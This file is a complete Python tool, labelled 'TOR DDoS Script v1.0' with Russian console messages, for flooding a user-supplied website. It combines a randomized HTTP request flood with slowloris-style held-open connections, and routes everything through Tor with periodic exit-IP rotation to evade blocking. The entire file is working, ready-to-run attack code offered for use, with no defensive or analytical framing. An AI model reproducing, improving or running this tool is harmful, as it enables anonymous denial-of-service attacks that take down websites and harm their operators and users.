#!/usr/bin/env python3

import sys
import socket
import threading
import time
import random
import requests
from stem import Signal
from stem.control import Controller
import socks
import urllib3
urllib3.disable_warnings()

class TORDDoS:
    def __init__(self, target_url, num_threads=50, attack_duration=60):
        self.target_url = target_url
        self.num_threads = num_threads
        self.attack_duration = attack_duration
        self.stop_attack = False
        self.requests_count = 0
        self.success_count = 0
        self.proxy_port = 9050
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        
        self.request_types = ['GET', 'POST', 'HEAD']
        self.fake_referers = [
            'https://www.google.com',
            'https://www.facebook.com',
            'https://www.reddit.com',
            'https://www.youtube.com'
        ]
        
    def setup_tor_proxy(self):
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", self.proxy_port)
        socket.socket = socks.socksocket
        
    def rotate_tor_ip(self):
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                print(f"[{time.strftime('%H:%M:%S')}] IP сменен через Tor")
                time.sleep(5)
        except Exception as e:
            print(f"[-] Ошибка смены IP: {e}")
    
    def send_http_flood(self):
        while not self.stop_attack:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'DNT': '1',
                    'Referer': random.choice(self.fake_referers)
                }
                
                session = requests.Session()
                session.proxies = {
                    'http': f'socks5h://127.0.0.1:{self.proxy_port}',
                    'https': f'socks5h://127.0.0.1:{self.proxy_port}'
                }
                
                method = random.choice(self.request_types)
                
                if method == 'POST':
                    fake_data = {
                        'username': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
                        'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12)),
                        'email': f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}@gmail.com"
                    }
                    response = session.post(self.target_url, 
                                           headers=headers, 
                                           data=fake_data, 
                                           timeout=10,
                                           verify=False)
                else:
                    response = session.get(self.target_url, 
                                          headers=headers, 
                                          timeout=10,
                                          verify=False)
                
                self.requests_count += 1
                if response.status_code < 400:
                    self.success_count += 1
                
                time.sleep(random.uniform(0.1, 0.5))
                
                if random.random() < 0.05:
                    self.rotate_tor_ip()
                    
            except Exception as e:
                continue
    
    def send_slowloris(self):
        while not self.stop_attack:
            try:
                sock = socks.socksocket()
                sock.set_proxy(socks.SOCKS5, "127.0.0.1", self.proxy_port)
                
                if self.target_url.startswith('http://'):
                    host = self.target_url.split('/')[2]
                    port = 80
                elif self.target_url.startswith('https://'):
                    host = self.target_url.split('/')[2]
                    port = 443
                else:
                    host = self.target_url.split('/')[0]
                    port = 80
                
                if ':' in host:
                    host, port = host.split(':')
                    port = int(port)
                
                sock.connect((host, port))
                
                request = f"GET /{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))} HTTP/1.1\r\n"
                request += f"Host: {host}\r\n"
                request += "User-Agent: " + random.choice(self.user_agents) + "\r\n"
                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                request += "Accept-Language: en-US,en;q=0.5\r\n"
                request += "Accept-Encoding: gzip, deflate\r\n"
                request += "Connection: keep-alive\r\n"
                request += "Keep-Alive: timeout=900, max=1000\r\n"
                
                sock.send(request.encode())
                
                keep_alive_start = time.time()
                while time.time() - keep_alive_start < 60 and not self.stop_attack:
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        time.sleep(random.uniform(10, 30))
                    except:
                        break
                
                sock.close()
                self.requests_count += 1
                
            except Exception as e:
                continue
    
    def start_attack(self):
        print(f"[+] Запуск TOR DDoS атаки на {self.target_url}")
        print(f"[+] Количество потоков: {self.num_threads}")
        print(f"[+] Длительность: {self.attack_duration} секунд")
        print(f"[+] Tor SOCKS порт: {self.proxy_port}")
        print("[=" * 30)
        
        try:
            self.setup_tor_proxy()
            test_socket = socks.socksocket()
            test_socket.set_proxy(socks.SOCKS5, "127.0.0.1", self.proxy_port)
            test_socket.settimeout(5)
            test_socket.connect(("check.torproject.org", 80))
            test_socket.close()
            print("[+] Tor подключен и работает")
        except:
            print("[-] Tor не запущен на порту 9050")
            print("[-] Запустите: sudo systemctl start tor")
            sys.exit(1)
        
        threads = []
        for i in range(self.num_threads):
            if i % 3 == 0:
                t = threading.Thread(target=self.send_slowloris)
            else:
                t = threading.Thread(target=self.send_http_flood)
            t.daemon = True
            threads.append(t)
        
        for t in threads:
            t.start()
            time.sleep(0.1)
        
        start_time = time.time()
        
        while time.time() - start_time < self.attack_duration:
            elapsed = time.time() - start_time
            print(f"[{time.strftime('%H:%M:%S')}] Атака: {elapsed:.1f}/{self.attack_duration}с | "
                  f"Запросы: {self.requests_count} | Успешно: {self.success_count} | "
                  f"RPS: {self.requests_count/max(elapsed, 1):.1f}")
            time.sleep(1)
        
        self.stop_attack = True
        print("[+] Остановка атаки...")
        
        for t in threads:
            t.join(timeout=2)
        
        total_time = time.time() - start_time
        print("\n" + "="*50)
        print("[+] АТАКА ЗАВЕРШЕНА")
        print(f"[+] Общее время: {total_time:.1f} секунд")
        print(f"[+] Всего запросов: {self.requests_count}")
        print(f"[+] Успешных запросов: {self.success_count}")
        print(f"[+] Средний RPS: {self.requests_count/total_time:.1f}")
        print("[+] IP адреса были сменены через Tor каждые несколько запросов")
        print("="*50)

def main():
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║                 TOR DDoS Script v1.0                     ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    target_url = input("[?] Введите целевой URL (http://example.com): ").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    try:
        num_threads = int(input("[?] Количество потоков [50]: ") or "50")
        attack_duration = int(input("[?] Длительность атаки в секундах [60]: ") or "60")
    except:
        print("[-] Неверный ввод, используем значения по умолчанию")
        num_threads = 50
        attack_duration = 60
    
    try:
        attacker = TORDDoS(target_url, num_threads, attack_duration)
        attacker.start_attack()
    except KeyboardInterrupt:
        print("\n[!] Атака остановлена пользователем")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Критическая ошибка: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        import socks
        import stem
        import requests
    except ImportError:
        print("[!] Установите зависимости:")
        print("pip install PySocks stem requests urllib3")
        sys.exit(1)
    
    main()
